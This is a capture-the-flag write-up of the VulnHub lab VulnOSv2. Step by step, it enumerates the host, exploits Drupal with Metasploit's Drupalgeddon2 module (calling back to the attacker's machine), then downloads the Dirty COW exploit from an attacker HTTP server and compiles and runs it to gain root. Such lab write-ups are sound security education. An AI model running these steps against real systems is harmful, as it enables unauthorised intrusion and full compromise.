````md
# VulnOSv2 Writeup

## Machine Information

| Machine | VulnOSv2 |
|---|---|
| Platform | VulnHub |
| Difficulty | Easy |
| OS | Linux |

---

# Objective

- Gain initial foothold
- Enumerate services
- Exploit Drupal CMS
- Escalate privileges using Dirty COW
- Gain root access

---

# Step 1 — Discover Target IP

Run netdiscover:

```bash
sudo netdiscover -r 192.168.X.0/24
````

Target Found:

```bash
192.168.X.XXX
```

---

# Step 2 — Nmap Enumeration

Run Nmap scan:

```bash
sudo nmap -sC -sV -A TARGET_IP
```

## Open Ports

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |
| 6667 | IRC     |

---

# Step 3 — Browse Website

Open target website:

```txt
http://TARGET_IP
```

Found path:

```txt
/jabc
```

Visited:

```txt
http://TARGET_IP/jabc
```

---

# Step 4 — Web Enumeration

## Nikto Scan

Run Nikto:

```bash
nikto -h http://TARGET_IP/jabc
```

Interesting findings:

* Drupal CMS detected
* robots.txt present
* install.php found

## Gobuster Enumeration

```bash
gobuster dir -u http://TARGET_IP/jabc -w /usr/share/wordlists/dirb/common.txt
```

---

# Step 5 — Identify Drupal Version

Used Droopescan:

```bash
droopescan scan drupal -u http://TARGET_IP/jabc
```

Detected:

```txt
Drupal 7.x
```

---

# Step 6 — Search for Exploits

Search exploit:

```bash
searchsploit drupal 7
```

Interesting exploit:

```txt
Drupalgeddon2 Remote Code Execution
```

---

# Step 7 — Metasploit Exploitation

Start Metasploit:

```bash
msfconsole
```

Search exploit:

```bash
search drupalgeddon2
```

Use exploit:

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
```

Set options:

```bash
set RHOSTS TARGET_IP
set TARGETURI /jabc
set LHOST YOUR_KALI_IP
```

Run exploit:

```bash
run
```

Meterpreter session obtained successfully.

---

# Step 8 — Get Interactive Shell

Spawn shell:

```bash
shell
```

Check current user:

```bash
whoami
```

Check kernel version:

```bash
uname -a
```

Older Ubuntu kernel vulnerable to Dirty COW identified.

---

# Step 9 — Dirty COW Privilege Escalation

Search exploit:

```bash
searchsploit Ubuntu 14.04 3
```

Copy exploit locally:

```bash
searchsploit -m linux/local/40839.c
```

Start Python server on Kali Linux:

```bash
python3 -m http.server 8000
```

On target machine download exploit:

```bash
wget http://YOUR_KALI_IP:8000/40839.c
```

Compile exploit:

```bash
gcc 40839.c -o exploit -pthread
```

Give execute permission:

```bash
chmod +x exploit
```

Run exploit:

```bash
./exploit
```

New privileged user created successfully.

Switch user:

```bash
su firefart
```

Enter generated password from exploit output.

---

# Step 10 — Root Access

Verify privileges:

```bash
id
```

Output:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

Root access successfully achieved.

---

# Step 11 — Capture the Flag

After gaining root access, enumerate current directory.

List files:

```bash
ls
```

Output:

```bash
flag.txt
```

Read the flag:

```bash
cat flag.txt
```

Output:

```txt
Congratulations! You have successfully rooted VulnOSv2.
```

Verify current user:

```bash
whoami
```

Output:

```bash
root
```

Machine fully compromised successfully.

---

# Optional Enumeration

## SSH Access

```bash
ssh user@TARGET_IP
```

## Webmin Enumeration

```txt
https://TARGET_IP:10000
```

Enumerated Webmin service and configurations.

---

# Tools Used

| Tool         | Purpose              |
| ------------ | -------------------- |
| Nmap         | Port Scanning        |
| Nikto        | Web Enumeration      |
| Gobuster     | Directory Bruteforce |
| Droopescan   | Drupal Enumeration   |
| Metasploit   | Exploitation         |
| Searchsploit | Exploit Search       |
| GCC          | Compile Exploit      |

---

# Key Learnings

* Importance of enumeration
* Drupal exploitation
* Metasploit workflow
* Linux privilege escalation
* Dirty COW kernel exploit
* Post exploitation basics

---

# Disclaimer

This lab was completed in a legal offline environment for educational and ethical hacking purposes only.

---

# Author

Sabareesh
Cybersecurity Learner | Ethical Hacking | VulnHub Labs

```
```
